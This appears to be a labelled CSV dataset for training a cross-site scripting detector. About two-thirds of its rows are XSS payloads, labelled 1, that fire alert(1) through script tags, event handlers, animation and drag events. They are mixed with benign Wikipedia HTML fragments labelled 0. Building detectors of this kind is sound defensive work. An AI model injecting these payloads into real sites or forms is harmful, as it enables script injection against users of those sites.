Sentence,Label
<script\x20type="text/javascript">javascript:alert(1);</script>,1
<script\x3Etype="text/javascript">javascript:alert(1);</script>,1
<script\x0Dtype="text/javascript">javascript:alert(1);</script>,1
<script\x09type="text/javascript">javascript:alert(1);</script>,1
<script\x0Ctype="text/javascript">javascript:alert(1);</script>,1
<script\x2Ftype="text/javascript">javascript:alert(1);</script>,1
<script\x0Atype="text/javascript">javascript:alert(1);</script>,1
<img src=1 href=1 onerror="javascript:alert(1)"></img>,1
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>,1
<video src=1 href=1 onerror="javascript:alert(1)"></video>,1
<body src=1 href=1 onerror="javascript:alert(1)"></body>,1
<image src=1 href=1 onerror="javascript:alert(1)"></image>,1
<object src=1 href=1 onerror="javascript:alert(1)"></object>,1
<script src=1 href=1 onerror="javascript:alert(1)"></script>,1
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>,1
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>,1
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>,1
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>,1
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>,1
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>,1
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>,1
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>,1
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>,1
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>,1
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>,1
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>,1
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>,1
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>,1
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>,1
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>,1
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>,1
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>,1
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>,1
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>,1
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>,1
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>,1
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>,1
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>,1
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>,1
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>,1
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>,1
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>,1
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>,1
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>,1
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>,1
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>,1
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>,1
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>,1
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>,1
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>,1
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>,1
<object onError object onError="javascript:javascript:alert(1)"></object onError>,1
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>,1
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>,1
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>,1
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>,1
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>,1
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>,1
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>,1
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>,1
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>,1
<body onload body onload="javascript:javascript:alert(1)"></body onload>,1
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>,1
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>,1
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>,1
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>,1
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>,1
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>,1
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>,1
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>,1
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>,1
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>,1
<script>javascript:alert(1)</script\x0D,1
<script>javascript:alert(1)</script\x0A,1
<script>javascript:alert(1)</script\x0B,1
<script charset="\x22>javascript:alert(1)</script>,1
javascript:alert(1),1
<SCRIPT>javascript:alert(1)</SCRIPT>,1
alert(1),1
">alert(1)<",1
"<strong ondblclick=alert(1)>test</strong>",1
"<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>",1
"</span>",1
"<li><a href=""/wiki/Mind%E2%80%93body_problem"" title=""Mind–body problem"">Mind–body problem </a>",0
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,1
"<col draggable=""true"" ondragenter=""alert(1)"">test</col>",1
<caption onpointerdown=alert(1)>XSS</caption>,1
	 </span>,0
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,1
"<style onmouseleave=""alert(1)"">test</style>",1
<svg><meta onload=alert(1)></meta>,1
"<li><a href=""/wiki/Programming_language"" title=""Programming language"">Programming language </a> </li>",0
<figcaption onpointerleave=alert(1)>XSS</figcaption>,1
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.economist.com/news/special-report/21700756-artificial-intelligence-boom-based-old-idea-modern-twist-not"">""From not working to neural networking"" </a>. <i>The Economist </i>. 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 April ",0
</div>,0
<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>,1
<input type=image src=1 onerror=alert(1)>,1
"<strong ondblclick=""alert(1)"">test</strong>",1
"<li><a href=""/wiki/Computer_data_storage"" title=""Computer data storage"">Information storage systems </a> </li>",0
"<div draggable=""true"" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>",1
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
"	 </span> <span class=""reference-text""><cite class=""citation journal""><a href=""/wiki/Woody_Evans"" title=""Woody Evans"">Evans, Woody </a> (2015). ""Posthuman Rights: Dimensions of Transhuman Worlds"". <i>Teknokultura </i>. <b>12 </b> (2). <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.5209%2Frev_TK.2015.v12.n2.49072"">10.5209/rev_TK.2015.v12.n2.49072 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Teknokultura&amp;rft.atitle=Posthuman+Rights%3A+Dimensions+of+Transhuman+Worlds&amp;rft.volume=12&amp;rft.issue=2&amp;rft.date=2015&amp;rft_id=info%3Adoi%2F10.5209%2Frev_TK.2015.v12.n2.49072&amp;rft.aulast=Evans&amp;rft.aufirst=Woody&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
"<spacer onkeypress=""alert(1)"" contenteditable>test</spacer>",1
"<li><cite id=""CITEREFOudeyer2010"" class=""citation journal"">Oudeyer, P-Y. (2010). <a rel=""nofollow"" class=""external text"" href=""http://www.pyoudeyer.com/IEEETAMDOudeyer10.pdf"">""On the impact of robotics in behavioral and cognitive sciences: from insect navigation to human cognitive development"" </a> <span class=""cs1-format"">(PDF) ",0
"<style>@keyframes slidein {}</style><center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></center>",1
"<pre draggable=""true"" ondragend=""alert(1)"">test</pre>",1
	 </span>,0
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 8 </li> </ul>",0
<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>,1
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationstart=""alert(1)""></main>",1
"<article draggable=""true"" ondrag=""alert(1)"">test</article>",1
"<li><a href=""/wiki/Computational_physics"" title=""Computational physics"">Computational physics </a> </li>",0
"	 </span>. <i>Behavioral and Brain Sciences </i>. <b>3 </b> (3): 417–457. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1017%2FS0140525X00005756"">10.1017/S0140525X00005756 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Behavioral+and+Brain+Sciences&amp;rft.atitle=Minds%2C+Brains+and+Programs&amp;rft.volume=3&amp;rft.issue=3&amp;rft.pages=417-457&amp;rft.date=1980&amp;rft_id=info%3Adoi%2F10.1017%2FS0140525X00005756&amp;rft.aulast=Searle&amp;rft.aufirst=John&amp;rft_id=http%3A%2F%2Fcogprints.org%2F7150%2F1%2F10.1.1.83.5248.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>",1
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Prakken, Henry (31 August 2017). ""On the problem of making autonomous vehicles conform to traffic law"". <i>Artificial Intelligence and Law </i>. <b>25 </b> (3): 341–363. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2Fs10506-017-9210-0"">10.1007/s10506-017-9210-0 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Artificial+Intelligence+and+Law&amp;rft.atitle=On+the+problem+of+making+autonomous+vehicles+conform+to+traffic+law&amp;rft.volume=25&amp;rft.issue=3&amp;rft.pages=341-363&amp;rft.date=2017-08-31&amp;rft_id=info%3Adoi%2F10.1007%2Fs10506-017-9210-0&amp;rft.aulast=Prakken&amp;rft.aufirst=Henry&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
"	<sup id=""cite_ref-Biological_intelligence_vs._intelligence_in_general_16-1"" class=""reference""><a href=""#cite_note-Biological_intelligence_vs._intelligence_in_general-16"">&#91;16&#93; </a> </sup>",0
"			<div class=""thumbcaption"">",0
"<li id=""cite_note-recurse-409""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-recurse_409-0"">^ </a> </b> ",0
"<div draggable=""true"" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",1
		 </div>,0
"<li><a href=""/wiki/Glossary_of_calculus"" title=""Glossary of calculus"">Calculus </a> </li>",0
"<frame oncut=""alert(1)"" contenteditable>test</frame>",1
"<ul class=""simple"">",0
"<frameset onmouseover=""alert(1)"">test</frameset>",1
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationstart=""alert(1)""></nobr>",1
"<h4><span class=""mw-headline"" id=""Technological_singularity"">Technological singularity ",0
	 </span>(1700) </li>,0
<iframe onload=alert(1)></iframe>,1
"<strong draggable=""true"" ondragstart=""alert(1)"">test</strong>",1
	 </span> </h3>,0
"<li id=""cite_note-304""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-304"">^ </a> </b> ",0
"<!DOCTYPE html><html class=""no-js"" lang=""en"" > ",0
"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationstart=""alert(1)""></h1>",1
<article onpointerleave=alert(1)>XSS</article>,1
"<nextid onmousemove=""alert(1)"">test</nextid>",1
javascript:document.location=,1
"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationend=""alert(1)""></area>",1
<blockquote onpointermove=alert(1)>XSS</blockquote>,1
<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>,1
"	 <div style=""padding:0em 0.25em"">",0
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
	 </span>,0
"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationend=""alert(1)""></title>",1
"<li><a href=""/wiki/Brain%E2%80%93computer_interface"" title=""Brain–computer interface"">Neurocybernetics </a> </li>",0
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Mathematics<br />of computing </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
